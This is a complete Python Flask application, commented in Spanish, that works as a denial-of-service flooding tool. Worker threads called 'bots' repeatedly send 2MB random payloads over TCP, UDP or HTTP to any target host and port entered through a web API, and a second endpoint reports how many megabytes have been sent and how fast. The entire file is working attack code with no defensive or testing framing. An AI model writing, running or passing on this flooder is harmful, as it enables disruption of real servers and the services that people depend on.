import threading
import time
import random
import socket
import requests
import os
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Control y Estadísticas
bots_activos = False
stats = {"total_enviado_mb": 0, "velocidad_mbs": 0, "hilos_vivos": 0, "latencia": "0ms"}
ultimo_total = 0

def bot_worker(target, target_type, port):
    global bots_activos, stats
    stats["hilos_vivos"] += 1
    # Paquete de 2MB aleatorios para dar peso al ping
    data_packet = random._urandom(2 * 1024 * 1024)
    
    while bots_activos:
        try:
            inicio = time.time()
            if target_type == "TCP":
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2); s.connect((target, int(port))); s.sendall(data_packet)
            elif target_type == "UDP":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    for i in range(0, len(data_packet), 60000):
                        if not bots_activos: break
                        s.sendto(data_packet[i:i+60000], (target, int(port)))
            elif target_type == "HTTP":
                requests.post(f"http://{target.replace('http://','')}:{port}", data=data_packet, timeout=2)
            
            stats["total_enviado_mb"] += 2
            stats["latencia"] = f"{int((time.time() - inicio) * 1000)}ms"
        except:
            time.sleep(1) # Reintento
    stats["hilos_vivos"] -= 1

def monitor_red():
    global ultimo_total, stats
    while True:
        actual = stats["total_enviado_mb"]
        stats["velocidad_mbs"] = round(actual - ultimo_total, 2)
        ultimo_total = actual
        time.sleep(1)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/control', methods=['POST'])
def control():
    global bots_activos
    data = request.json
    if data.get("action") == "start":
        bots_activos = True
        cantidad = int(data.get("threads", 1))
        for _ in range(cantidad):
            threading.Thread(target=bot_worker, args=(data.get("target"), data.get("type"), data.get("port")), daemon=True).start()
        return jsonify({"status": "ok"})
    bots_activos = False
    return jsonify({"status": "stop"})

@app.route('/api/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    threading.Thread(target=monitor_red, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
